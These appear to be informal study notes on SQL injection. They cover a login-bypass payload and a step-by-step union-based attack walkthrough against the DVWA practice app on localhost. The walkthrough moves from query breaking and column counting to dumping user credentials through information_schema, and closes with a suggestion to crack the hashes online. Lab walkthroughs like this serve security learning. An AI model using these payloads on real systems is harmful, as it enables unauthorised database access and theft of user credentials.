sql injection 

tools 
sql map 


first find a place where database are used like in our login page we used database for checking
username and password 

in input field put sql symbols  
' " order_by and like this see any error is coming or not  

some usefule sql command for injection 

--  start of the comments 
OR Either of the input should be true
AND  both of the input  should be true 
1=1  A statement is always true


to bypass login 

if there is username and password so sql command is 
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

if we put the username and add -- comment to password is eliminated automatically 

administrator'--     === payload

SQL Injections
==============
	Where an attacker passes the malicious SQL commands just to gain the juicy information from the database.
	SQLi

UNION BASED SQL INJECTION
=========================
	Where an attacker uses the union command to collect the information and merge it into one table. He passes malicious commands and queries in the database to do so.

DEMO
====
DVWA ---> Security:Low 
			SQL Injection
Step 1
======
To find 'GET' parameter.
	something=something
		php?id=something
		php?id=cat
		php?id=1
		php?id=query

	Either you click on some link of the web application|site or enter something in the search box.

	http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1&Submit=Submit#

Step 2
======
To generate a SQL error, to break the query.
	1
	1'

	http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1'&Submit=Submit#

	You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1

	'select * from table '
	'select * from table' '

Step 3
======
To count the number of columns, in the web application.
	For counting the number of columns, we will use order by

	http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1' order by 1--+&Submit=Submit#
		Shows us data
		This query means that we are asking the database to arrange the data according to column number 1

	http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1' order by 2--+&Submit=Submit#
		Shows me data
		This query means that we are asking the database to arrange the data according to column number 2

	http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1' order by 3--+&Submit=Submit#
		Gives us an error
			Unknown column '3' in 'order clause'
		This query means that I am asking the database to arrange the data according to column number 3
		But there is no column number 3 --> so it will generate an error

order by n--+
	n starts from 1 and ends when i receive an error for the value of n
	--+ ---> To comment out
			if there is any data passed down after --+, it will not execute at all. we can also use # to comment out the rest content.

	There are 2 columns, in the database.

Step 4
======
To merge the data of all the columns, using UNION command.
	union select 1,2,...,n-1--+
	n=3
	union select 1,2--+


http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1' union select 1,2--+&Submit=Submit#

		ID: 1' union select 1,2-- 
		First name: admin
		Surname: admin

		ID: 1' union select 1,2-- 
		First name: 1
		Surname: 2

http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1' union select database(),version()--+&Submit=Submit#
	
	database() --> database name
	version()  --> Database Version Number

Step 5
======
To call database ki ma --> information_schema, for getting the information about the table names
	Information_schema --> it is meta table --> it contains the name of tables and columns which are present in the database.
		information_schema.tables
					|-> It stores the name of all the table names in the database.

	union select table_name,2 from information_schema.tables--+
					or
	union select 1,table_name from information_schema.tables--+


	We can apply both of them because both the fields are vulnerable otherwise we will go for the one which is vulnerable.

	http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1' union select 1,table_name from information_schema.tables--+&Submit=Submit#

Step 6
======
I will again call database ki maa for columns names in the table names as users
	information_schema
	information_schema.columns

	union select 1,column_name from information_schema.columns where table_name="users"--+


Step 7
======
To retreive or dump data from the above info.
	DVWA --> Users --> (User_id,first_name,Last_name,user,Password)

	union select 1,group_concat(User_id,0x0a,first_name,0x0a,Last_name,0x0a,user,0x0a,Password,0x3a) from users--+



Password is in hashed form so we will go online and check if the hash value of the value is availble or not.
